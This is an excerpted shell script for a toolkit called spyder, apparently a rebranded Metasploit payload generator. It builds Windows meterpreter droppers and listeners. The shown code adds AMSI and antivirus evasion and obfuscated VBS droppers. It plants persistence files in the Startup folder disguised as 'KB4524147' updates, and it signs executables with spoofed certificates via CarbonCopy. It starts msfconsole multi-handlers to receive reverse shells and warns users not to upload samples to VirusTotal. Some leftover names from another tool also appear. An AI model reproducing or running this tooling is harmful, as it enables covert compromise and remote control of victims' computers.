#!/bin/sh
# --------------------------------------------------------------
# spyder - metasploit Shellcode generator/compiler/listenner
...
if [ $(id -u) != "0" ]; then
  ...
  echo "[x] execute [ sudo ./spyder.sh] on terminal"
  exit
fi
...
IPATH=`pwd` # grab spyder.sh install path (home/username/shell)
# ------------------------------------------------------------------------
...
# -------------------------------------------
# SETTINGS FILE FUNTION (spyder-main/settings)
# -------------------------------------------
...
# -----------------------------------------------
# spyder framework configurated to store logfiles?
# -----------------------------------------------
if [ "$MsFlF" = "ON" ]; then
echo ${BlueF}
cat << !
...
cat << !
    ...
    ║                              ---                                    ║
    ║ This setting forces spyder toolkit at startup to backup/replace the  ║
...
sleep 2
    ...
    echo ${BlueF}[☠]${white} Replace default modules by spyder modules ..${Reset}
    sleep 1
...
echo "Framework: spyder v1.0.17" >> $IPATH/output/exec.c
...
if [ "$Ext" = "dll" ]; then
  ...
  echo "exit" >> $IPATH/output/installer.batvenomvenom
  sleep 2
fi
...
# replace NaM3 by $N4m (var grab by spyder.sh)
...
# reproduction of spyder option 6 payload
...
# P.S. python outputs in spyder uses (windows/meterpreter) ;)
# -----------------------------------------------------------------
sh_shellcode17 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
...
# move agent to the rigth directory (spyder)
...
echo "Framework: spyder v1.0.17" >> htop.c
...
echo "Framework: spyder v1.0.17" >> $mP4.c
...
spyderovni=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2) # Read settings from venom-main settings file.
if [ "$serv" = "multi-handler (default)" ]; then

   original_string="sudo ./$mP4.mp4";color="${RedF}"
   ## Read the next setting from spyder-main setting file .
   if [ "$ovni" = "ON" ]; then
      ## Reverse original string (spyder attack vector)
   ...
   ## Print on terminal
   echo ${white}[☠] spyder-main/Settings: [OBFUSCATION:$color$ovni${white}]${Reset};sleep 1
   ...
   echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
   echo "[☯] Please dont test samples on virus total .."
   ## Is spyder framework configurated to store logfiles?
   if [ "$MsFlF" = "ON" ]; then
...
## Check if 'spyderconf' local file exists
if ! [ -e "$IPATH/bin/SillyRAT/spyderconf" ]; then
   ...
   ## Write 'spyderconf' file to prevent the install function from running again
   echo " spyder'SillyRAT' configuration file" > spyderconf
   cd $IPATH
fi
...
if [ "$SOSP" = "Windows" ]; then
   ...
   if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
      ...
      echo ":: Framework: spyder v1.0.17 - shinigami" > $Drop.bat
      ...
      if [ "$vbsevasion" = "ON" ]; then
         echo "Framework: spyder v1.0.17 - Amsi Evasion - Agent nº6" >> $Drop.c
      else
         echo "Framework: spyder v1.0.17 - Multi-OS - Agent nº5" >> $Drop.c
      fi
...
# chose to use spyder to build the payload or input your own binary.exe
...
sleep 1
if [ "$chose" = "Build spyder agent.bat" ]; then
echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
   ...
   if [ "$serv" = "multi-handler (default)" ]; then
      ...
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          ...
          if [ "$chose" = "Build spyder agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
...
cd $IPATH/obfuscate
xterm -T "SPYDER - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$slave.exe $IPATH/output/signed-$slave.exe && sleep 2"
...
cd $IPATH
cd ..
sudo chown -hR $user spyder-main > /dev/null 2>&1
echo "${BlueF}[☠]${white} Report-Bugs: https://github.com/r00t-3xp10it/spyder/issues"${Reset};
exit
}
...
cat << !
    ...
    OBFUSCATION: If activated, creates a VBS dropper insted of PS1
                 ...
                 of spyder dropper on target machine (silent execution)
!
...
cat << !
    ...
    OBFUSCATION: If activated, 'persistence' creates a VBS insted of BAT
                 ...
                 spyder persistence scripts on target machine (silent exec)
!
echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
read odf
clear
...
cat << !
    ...
    OBFUSCATION: If activated, dropper.exe its signed for AV evasion.
                 Using @paranoidninja - CarbonCopy script that signs spyder
...
if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ] || [ -z "$easter_egg" ]; then
   ...
   echo "Framework: spyder v1.0.17 (amsi evasion)" >> $IPATH/output/$Drop.ps1
   echo "#>" >> $IPATH/output/$Drop.ps1
   ...
   echo "' Framework: spyder v1.0.17 (amsi evasion)" > $IPATH/output/$Drop.vbs
...
echo "Framework: spyder v1.0.17 (amsi evasion)" >> $IPATH/output/$NaM.ps1
...
if [ "$persistence" = "Dont Add Persistence" ]; then
   ...
   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
      ...
      echo "echo :: Framework: spyder v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
...
echo "Framework: spyder v1.0.17 - shinigami" >> $IPATH/output/$NaM.ps1
echo "#>" >> $IPATH/output/$NaM.ps1
echo "" >> $IPATH/output/$NaM.ps1
...
echo "${BlueF}[☠]${white} spyder-main/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 2
cd $IPATH
...
if [ "$persistence" = "Dont Add Persistence" ]; then
   ...
   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
      ...
      echo "echo :: Framework: spyder v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
...
if [ "$ArCh" = "x86" ]; then
  ...
  echo "- 'For that reason spyder its impotent to do anything more '..."
  echo "---"${Reset};
...
if ! [ "$?" -eq "0" ]; then
   ...
   echo "${BlueF}---"
   echo "- meterpeter Framework Depends of Powershell (pwsh) installed under"
   echo "- Linux Distros. spyder will try to auto-Install all dependencies .."
   echo "---"${Reset};
   ...
   echo ""
     ...
     if ! [ "$?" -eq "0" ]; then
        echo "${RedF}[x]${white} Check: spyder Cant install powershell (pwsh)"${Reset};sleep 2
        echo "${RedF}[x] Powershell Default Dir: /usr/bin/pwsh"${Reset};
        echo "${BlueF}[☠]${white} Press [Enter] to return to amsi menu ..";
        read op;clear;sh_ninja
     else
        echo "${BlueF}[${YellowF}i${BlueF}]${white} Check: spyder Reports that pwsh was successfull installed."${Reset};
        sleep 3
     fi
else
...
if [ -e "$IPATH/bin/meterpeter/Update-KB4524147.ps1" ]; then
   ...
   ## Write handler file to spyder output folder
...
if [ "$multiArch" = "TRUE" ]; then
   ...
   arch="wine64" # Define 'spyder' $arch variable again, to be able use other modules. 
fi
...
if [ "$easter_egg" = "ON" ]; then
   ...
   echo "Framework: spyder v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
...
echo "Framework: spyder v1.0.17 - shinigami" >> $IPATH/output/Client.ps1
echo "#>" >> $IPATH/output/Client.ps1
echo "" >> $IPATH/output/Client.ps1
...
echo "${BlueF}[${YellowF}i${BlueF}]${white} spyder/output/key.pem + cert.pem ([${GreenF}OK${white}])";sleep 2
cd $IPATH
...
echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate: $SSL_domain"${Reset};sleep 2
cd $IPATH/obfuscate
xterm -T " SPYDER - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$NaM.exe $IPATH/output/signed-$NaM.exe && sleep 2"
...
cat << !
            ...
            |_______  |_________| |        | |         |  |_________ |________|        
                   |  |           |________| |         |  |          |        \  
                   |  |                    | |         |  |          |         \ 
            _______|  |           _________| |_________|  |_________ |          \V$ver
!
